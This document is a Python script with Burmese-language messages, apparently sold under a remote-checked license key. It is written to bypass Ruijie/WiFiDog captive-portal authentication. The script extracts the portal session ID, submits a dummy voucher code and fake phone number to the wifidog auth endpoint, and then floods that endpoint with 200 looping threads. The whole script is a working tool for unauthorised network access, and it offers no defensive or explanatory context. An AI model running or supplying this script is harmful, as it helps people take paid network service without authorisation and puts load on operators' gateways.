import requests, re, urllib3, time, threading, os, random, subprocess, sys
from urllib.parse import urlparse, parse_qs, urljoin
from datetime import datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- COLORS ---
Y, G, R, W, C, M, OFF = "\033[1;33m", "\033[1;32m", "\033[1;31m", "\033[1;37m", "\033[1;36m", "\033[1;35m", "\033[0m"

# --- CONFIG ---
VIP_URL = "https://raw.githubusercontent.com/kokoarkar446-cloud/Starlink/refs/heads/main/key.txt"
LICENSE_FILE = ".license_data"

def get_uid():
    try: return subprocess.check_output(['whoami']).decode('utf-8').strip()
    except: return "u0_a232"

def banner(name="GUEST", exp="----/--/-- --:--"):
    os.system('clear')
    print(f"{Y}      ██████╗ ██╗   ██╗██╗     ██╗██╗███████╗")
    print(f"{Y}      ██╔══██╗██║   ██║██║     ██║██║██╔════╝")
    print(f"{G}      ██████╔╝██║   ██║██║     ██║██║█████╗  ")
    print(f"{G}      ██╔══██╗██║   ██║██║██   ██║██║██╔══╝  ")
    print(f"{R}      ██║  ██║╚██████╔╝██║╚█████╔╝██║███████╗")
    print(f"{R}      ╚═╝  ╚═╝ ╚═════╝ ╚═╝ ╚════╝ ╚═╝╚══════╝")
    print(f"{W}╔" + "═"*60 + "╗")
    print(f"{W}║ {Y}⚡ USER ID : {Y}{get_uid():<39} {W}║")
    print(f"{W}║ {G}⚡ NAME    : {G}{name:<39} {W}║")
    print(f"{W}║ {R}⚡ EXPIRE  : {R}{exp:<39} {W}║")
    print(f"{W}╚" + "═"*60 + "╝\n")

def check_access():
    uid = get_uid()
    now = datetime.now()

    # ၁။ Offline စစ်ဆေးခြင်း
    if os.path.exists(LICENSE_FILE):
        try:
            with open(LICENSE_FILE, "r") as f:
                saved_data = f.read().strip().split('|')
                if saved_data[0] == uid:
                    v_name, v_exp_str = saved_data[1], saved_data[2]
                    expire_time = datetime.strptime(v_exp_str, "%Y-%m-%d %H:%M")
                    if now < expire_time:
                        banner(v_name, v_exp_str)
                        print(f" {G}[✓] OFFLINE ACTIVATED! {OFF}")
                        return True
        except: pass

    # ၂။ Online စစ်ဆေးခြင်း (Key မရှိလျှင် သို့ သက်တမ်းကုန်လျှင်)
    try:
        print(f" {Y}[*] Server မှ Key ကို စစ်ဆေးနေပါသည်...{OFF}")
        res = requests.get(f"{VIP_URL}?t={random.random()}", timeout=10, verify=False)
        if res.status_code == 200:
            for line in res.text.splitlines():
                if uid in line:
                    parts = line.split('|')
                    v_name, v_exp_str = parts[1].strip(), parts[2].strip()
                    expire_time = datetime.strptime(v_exp_str, "%Y-%m-%d %H:%M")
                    
                    if now < expire_time:
                        with open(LICENSE_FILE, "w") as f:
                            f.write(f"{uid}|{v_name}|{v_exp_str}")
                        banner(v_name, v_exp_str)
                        print(f" {G}[✓] KEY ACTIVATED SUCCESSFUL!{OFF}")
                        return True
                    else:
                        banner(v_name, v_exp_str)
                        print(f" {R}[!] သက်တမ်းကုန်ဆုံးသွားပါပြီ။ Admin ထံမှာ သက်တမ်းတိုးပါ။{OFF}")
                        sys.exit()

            # ID မရှိလျှင် ဝယ်ခိုင်းရန်
            banner("GUEST USER", "NO LICENSE")
            print(f" {R}╔══════════════════════════════════════════╗")
            print(f" ║ {R}     ACCESS DENIED (ခွင့်ပြုချက်မရှိပါ)    {R}║")
            print(f" ╚══════════════════════════════════════════╝{OFF}")
            print(f"\n {Y}[!] သင်၏ Device ID ကို Admin ထံပေးပို့ပြီး Key ဝယ်ယူပါ")
            print(f" {G}⚡ YOUR ID : {C}{uid}{OFF}")
            print(f" {M}[*] ID ကို ခပ်ကြာကြာဖိပြီး Copy ကူးယူပါ။{OFF}")
            sys.exit()
    except:
        print(f" {R}[!] အင်တာနက် မရှိပါ။ Key အသစ်စစ်ရန် အင်တာနက်လိုပါသည်။{OFF}")
        sys.exit()

def turbo_pulse(link):
    headers = {"User-Agent": "Mozilla/5.0", "Connection": "keep-alive"}
    while True:
        try:
            requests.get(link, timeout=5, verify=False, headers=headers)
            print(f" {Y}[{G}✓{R}] {W}TURBO ACTIVE >>> {C}[{random.randint(10,60)}ms] {OFF}", end="\r")
        except: time.sleep(0.5)

def start_speed_logic():
    session = requests.Session()
    try:
        print(f" {W}[*] {C}Bypassing Ruijie Gateways...{OFF}")
        r = requests.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)
        p_url = r.url
        r1 = session.get(p_url, verify=False, timeout=6)
        m = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
        n_url = urljoin(p_url, m.group(1)) if m else p_url
        r2 = session.get(n_url, verify=False, timeout=6)
        sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
        
        if sid:
            print(f" {G}[✓] Authorized SID: {sid[:10]}{OFF}")
            p_host = f"{urlparse(p_url).scheme}://{urlparse(p_url).netloc}"
            session.post(f"{p_host}/api/auth/voucher/", json={'accessCode': '123456', 'sessionId': sid, 'apiVersion': 1}, timeout=5)
            gw = parse_qs(urlparse(p_url).query).get('gw_address', [urlparse(p_url).netloc.split(':')[0]])[0]
            port = parse_qs(urlparse(p_url).query).get('gw_port', ['2060'])[0]
            auth_link = f"http://{gw}:{port}/wifidog/auth?token={sid}&phonenumber=12345"
            
            print(f" {M}[*] ⚡ 200 Threads Boost Active ⚡{OFF}")
            for _ in range(200):
                threading.Thread(target=turbo_pulse, args=(auth_link,), daemon=True).start()
            while True:
                time.sleep(5)
                if requests.get("http://google.com", timeout=5).status_code != 200: break
        else:
            print(f" {R}[!] Retry...{OFF}"); time.sleep(2); start_speed_logic()
    except: time.sleep(3); start_speed_logic()

if __name__ == "__main__":
    if check_access():
        start_speed_logic()
